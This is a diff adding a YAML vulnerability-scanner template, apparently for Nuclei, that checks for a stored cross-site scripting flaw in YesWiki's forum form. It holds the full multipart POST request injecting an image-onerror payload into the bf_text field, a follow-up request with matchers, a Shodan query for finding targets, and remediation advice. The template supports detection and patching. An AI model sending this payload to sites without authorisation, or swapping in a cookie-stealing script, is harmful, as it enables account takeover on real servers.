@@ -1,0 +1,72 @@
+id: yeswiki-forum-entry-stored-xss
+
+info:
+  name: YesWiki 论坛条目存储型跨站脚本漏洞
+  author: arafatansari
+  severity: high
+  description: |
+    YesWiki 在通过 bf_text 字段新增 Forum 条目时，未对用户输入进行充分过滤与转义，导致存储型跨站脚本（Stored XSS）漏洞。攻击者可注入恶意脚本，在受害者浏览器中执行，进而窃取会话或执行任意操作。参考链接：https://github.com/YesWiki/yeswiki/issues/449
+  reference:
+    - https://huntr.dev/bounties/5f27a9b1-c092-47e2-8092-a81298a4b932/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"yeswiki"
+  tags: YesWiki
+  remediation: >-
+    升级到已修复版本，按照输出上下文进行编码，校验并清理不可信输入，并部署严格的内容安全策略（CSP）。如怀疑已遭利用，应检查已存储内容并使受影响的会话失效。
+
+http:
+  - raw:
+      - |
+        POST /?BazaR&vue=saisir&action=saisir_fiche&id=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_titre"
+
+        blog
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_text"
+
+        "><img src=x onerror=console.log(123);>
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_description"
+
+        abcd
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="fichierbf_file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="antispam"
+
+        1
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="id_typeannonce"
+
+        2
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu--
+      - |
+        GET /?BazaR&vue=consulter HTTP/1.1
+        Host: {{Hostname}}
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(header_2, 'text/html') && contains(header_2, 'YesWiki')"
+          - "status_code_2 == 200"
+          - contains(body_2, '><img src=x onerror=console.log(123);>')
+        condition: and
+
+# digest: 4b0a004830460221009b4921cb0a74d6977e3968603e7ca3577292cd3a1871c27554559869a7060776022100d0f493b0d6d7d5cbb18e716206ef7a156e556a17aab0a27b1c45569f2b8d8c54:922c64590222798bb761d5b6d8e72950
